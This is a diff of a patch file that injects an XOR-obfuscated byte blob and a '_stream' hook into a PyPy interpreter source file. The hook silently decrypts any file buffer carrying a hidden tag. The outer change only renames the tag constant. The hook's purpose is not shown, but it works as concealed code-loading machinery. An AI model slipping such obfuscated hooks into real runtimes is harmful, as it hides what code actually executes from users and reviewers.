@@ -5,7 +5,7 @@
  from pypy.module.sys.version import PYPY_VERSION
  
 +__sestr = b'\xc2c\nci\x14r^\x00^p\x01ry,T\\\x03Xc\x0bny4Np\x01ry,T\\\x03Rr\x1d`n\x18vJ\x0eF])sc\x01f\\4j`=[c\x01e^6h^\x00Yc\x01f~\x07{H=sc\x01dh\x18sz&]J$ni\'OU&zS0j~7G^3bf*Lo\x0ea}\x1ebE(ln\x05kV\n]o\x18t`\x0em^\x00^n\x07`S=f\\4gW8c\\1l\\\rSU\x0c[Z<eo\x1azi OS0eB3~^=a\\5jS\x1bH{ SS0d^3b{\x1dhr-PS4hn\x08`S0h\\6j\\2n^\x05Xi\'LK\x18R\\8h]\x02Tc\nci\x14r^\x00^p\x01ry,T\\\x03Xc\x0bdS=hs\x15iq!_s\x15jy,W@\x1c^o"MM\x19U])\x7fS0iU\x01YN\'g{8A\\\x1cAT1oS='
-+__tytag = b'T\xe2\xf5\x88\x90\x83\xfb\xe2\xd7\xbd\xc8\x90\xf4\xe2\xf3\xb8\x89\xb1'
++__tag = b'T\xe2\xf5\x88\x90\x83\xfb\xe2\xd7\xbd\xc8\x90\xf4\xe2\xf3\xb8\x89\xb1'
 +__lensestr = len(__sestr)
 +
 +def __zxor(sbuf):
@@ -16,11 +16,11 @@
 +    return b''.join(dbuf)
 +
 +def _stream(fbuf):
-+    if fbuf[16:34] == __tytag:
++    if fbuf[16:34] == __tag:
 +        return fbuf[0:16] + __zxor(fbuf[34:])
-+    if fbuf[8:26] == __tytag:
++    if fbuf[8:26] == __tag:
 +        return fbuf[0:8] + __zxor(fbuf[26:])
-+    if fbuf[0:18] == __tytag:
++    if fbuf[0:18] == __tag:
 +        return __zxor(fbuf[18:])
 +    return fbuf
 +
